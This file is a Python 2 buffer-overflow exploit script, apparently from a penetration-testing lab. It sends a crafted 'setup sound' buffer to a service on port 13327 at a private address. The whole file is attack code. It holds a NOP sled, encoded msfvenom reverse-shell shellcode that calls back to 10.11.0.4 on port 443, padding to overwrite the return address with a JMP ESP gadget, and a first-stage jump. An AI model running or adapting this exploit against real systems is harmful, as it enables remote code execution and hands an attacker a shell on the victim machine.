#!/usr/bin/python
import socket
host = "192.168.143.44"

nop_sled = "\x90" * 8 # NOP sled
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f p

shellcode =  b""
shellcode += b"\xd9\xca\xbd\xbf\x7c\x0e\x32\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x12\x83\xe8\xfc\x31\x68\x13"
shellcode += b"\x03\xd7\x6f\xec\xc7\x16\x4b\x07\xc4\x0b\x28"
shellcode += b"\xbb\x61\xa9\x27\xda\xc6\xcb\xfa\x9d\xb4\x4a"
shellcode += b"\xb5\xa1\x77\xec\xfc\xa4\x7e\x84\x3e\xfe\xf6"
shellcode += b"\xdb\xd7\xfd\xf8\xe2\x9c\x8b\x18\x54\x84\xdb"
shellcode += b"\x8b\xc7\xfa\xdf\xa2\x06\x31\x5f\xe6\xa0\xa4"
shellcode += b"\x4f\x74\x58\x51\xbf\x55\xfa\xc8\x36\x4a\xa8"
shellcode += b"\x59\xc0\x6c\xfc\x55\x1f\xee"

padding = "\x41" * (4368 - len(nop_sled) - len(shellcode))

# found jmp esp : 0x08134596 ,...
eip = "\x96\x45\x13\x08" # 0x08134596
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nop_sled + shellcode + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"




